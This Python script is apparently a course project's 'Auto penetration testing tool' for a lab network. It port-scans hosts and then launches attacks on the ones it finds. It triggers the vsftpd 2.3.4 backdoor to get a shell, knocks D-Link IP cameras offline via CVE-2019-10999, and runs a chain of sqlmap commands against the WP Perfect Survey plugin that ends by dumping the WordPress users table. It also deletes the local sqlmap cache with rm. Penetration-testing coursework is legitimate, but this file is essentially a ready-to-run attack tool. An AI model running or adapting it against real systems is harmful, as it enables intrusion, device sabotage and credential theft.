#!/usr/bin/env python
import os
import sys
import ipaddress
import argparse
import subprocess

from src.vsftpd_exploit.exploit import ExploitFTP
from ipcam import *
from portscanner import *

DEFAULT_IP_RANGE = '10.81.1.0/29'
PROGRAM_NAME = 'Auto penetration testing tool'
SERVICE_LIST = ['vsftpd 2.3.4', 'apache web server', 'ip cam rtsp']


def ip_cam(ip, port):
	print("+------------------------+")
	print("| D-Link IP Cam Exploit  |")
	print("+------+-----------------+")
	print("| IP   | {}{} |".format(((15 - len(ip)) * " "), ip))
	print("| Port | {}{} |".format(((15 - len(str(port))) * " "), port))
	print("+------+-----------------+")
	print("")

	print("Please confirm if you want to paralyze the IP cam. [y/n]", end=" ")

	if ask_yn():
		print("")
		print("Start attack")
		print("---------------")

		result = dlink_cve_2019_10999(ip)

		print("Status: {}".format(result.status_code))
	else:
		print("Cancel")

	return


def ftp_server(ip, port):
	# vsftpd rce
	print("+------------------------+")
	print("| vsFTPd 2.3.4 RCE       |")
	print("+------+-----------------+")
	print("| IP   | {}{} |".format(((15 - len(ip)) * " "), ip))
	print("| Port | {}{} |".format(((15 - len(str(port))) * " "), port))
	print("+------+-----------------+")
	print("")

	if len(sys.argv) == 3:
		exploit = ExploitFTP(ip, port)
	else:
		exploit = ExploitFTP(ip)

	exploit.trigger_backdoor()
	exploit.get_shell()
	return


def wp_perfect_survey(ip, port):
	print("")
	print("SQL injection testing...")

	os.system("rm ~/.local/share/sqlmap -r")

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch'.format(
		ip, port)

	os.system(cmd)

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch --dbs'.format(
		ip, port)

	os.system(cmd)

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch --current-db'.format(
		ip, port)

	os.system(cmd)

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch -D wordpress --tables'.format(
		ip, port)

	os.system(cmd)

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch -D wordpress -T wp_users --columns'.format(
		ip, port)

	os.system(cmd)

	cmd = '/usr/bin/sqlmap -u "http://{}:{}/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --batch -D wordpress -T wp_users --dump'.format(
		ip, port)

	os.system(cmd)


def web_server(ip, port):
	print("Check if web framework is wordpress. [y/n]", end=" ")

	if ask_yn():
		print("")
		print("scanning web framework...")

		result = subprocess.run(["/usr/bin/wpscan", "--url", "http://{}:{}".format(ip, port)], stdout=subprocess.PIPE,
								encoding="utf-8")

		sys.stdout.write("\033[F")
		print(result.stdout)

		if str(result).find("perfect-survey"):
			if str(result).find("Version: 1.5.1"):
				print("")
				print("Find vulnerability Wordpress plugin (WP perfect survey)!")
				print("If you want to exploit it to get the website users info? [y/n]", end=" ")
				if ask_yn():
					wp_perfect_survey(ip, port)
				else:
					print("Cancel")

	else:
		print("Cancel")
	return


def ask_yn():
	ans = input()

	if ans == 'y' or ans == 'Y' or ans == "":
		return True
	else:
		return False


def ask_question(can_choose):
	user_choose = input()

	try:
		choose = int(user_choose)
	except ValueError:
		print("Error: Your input isn't in the list")
		return False

	if choose < 1 or choose > can_choose:
		print("Error: Your input isn't in the list")
		return False

	return choose


def attack_service(services):
	item_turn = 0
	print("")
	print("+------------------------------------------------------+")
	print("| Exploitable list                                     |")
	print("+-----+-----------------+-------+----------------------+")
	print("|   # | IP              | Port  | Service              +")
	print("+-----+-----------------+-------+----------------------+")
	for host in services:
		for service in services[host]:
			if service['exploit'] in SERVICE_LIST:
				item_turn += 1
				print("| {}{}".format((3 - len(str(item_turn))) * " ", item_turn), end=" ")
				print("| {}{}".format(((15 - len(host)) * " "), host), end=" ")
				print("| {}{}".format(((5 - len(str(service['port']))) * " "), service['port']), end=" ")
				print("| {}{} |".format(service['exploit'], (20 - len(service['exploit'])) * " "))
				print("+-----+-----------------+-------+----------------------+")

	if item_turn == 0:
		print("| Exploit not found                                    |")
		print("+------------------------------------------------------+")
		return

	print("")
	print("Choose the exploit target: ", end="")
	choose = ask_question(item_turn)

	if choose:
		item_turn = 0

		print("Your target: {}".format(choose))
		print("")

		for host in services:
			for service in services[host]:
				if service['exploit'] in SERVICE_LIST:
					item_turn += 1
					if choose == item_turn:
						match service['exploit']:
							case 'vsftpd 2.3.4':
								ftp_server(host, service['port'])
								return
							case 'ip cam rtsp':
								ip_cam(host, service['port'])
								return
							case 'apache web server':
								web_server(host, service['port'])
								return


def main():
	parser = argparse.ArgumentParser(description=PROGRAM_NAME + ' by Group 8 in 112 HTCF course ')
	parser.add_argument("-i", "--ip", action="store",
						help="specify IP address or IP range (EX: 10.81.1.0/29 or 10.81.1.1)")
	parser.add_argument("-p", "--port", action="store", help="specify port (EX: 80 or 21,80)")

	args = parser.parse_args()

	ip_address = DEFAULT_IP_RANGE

	if args.ip is not None:
		try:
			ipaddress.ip_address(args.ip)
			ip_address = args.ip
		except ValueError:
			try:
				ipaddress.ip_network(args.ip)
				ip_address = args.ip
			except ValueError:
				print('Error: Invalid IP address or range')
				return

	if args.port is None:
		port = '21,22,80,554'
	else:
		arr = args.port.split(',')
		for i in arr:
			try:
				port_check = int(i)
			except ValueError:
				print("Error: Invalid port")
				return

			if port_check <= 0 or port_check > 65535:
				print("Error: Invalid port")
				return
		port = args.port

	column_max_len = len(PROGRAM_NAME)
	if len(str(port)) > len(ip_address):
		column_max_len = len(str(ip_address)) + 12
	if len(str(port)) > column_max_len:
		column_max_len = len(str(port)) + 12

	print("+-------------{}-+".format((column_max_len - 12) * "-"))
	print("| {}{} |".format(PROGRAM_NAME, (column_max_len - len(PROGRAM_NAME)) * " "))
	print("+-----------+-{}-+".format((column_max_len - 12) * "-"))
	print("| Scan IP   | {}{} |".format(((column_max_len - 12 - len(ip_address)) * " "), ip_address))
	print("| Scan port | {}{} |".format(((column_max_len - 12 - len(str(port))) * " "), str(port)))
	print("+-----------+-{}-+".format((column_max_len - 12) * "-"))
	print("")
	print("Scanning...")

	attack_service(portscan(ip_address, port))


if __name__ == '__main__':
	main()
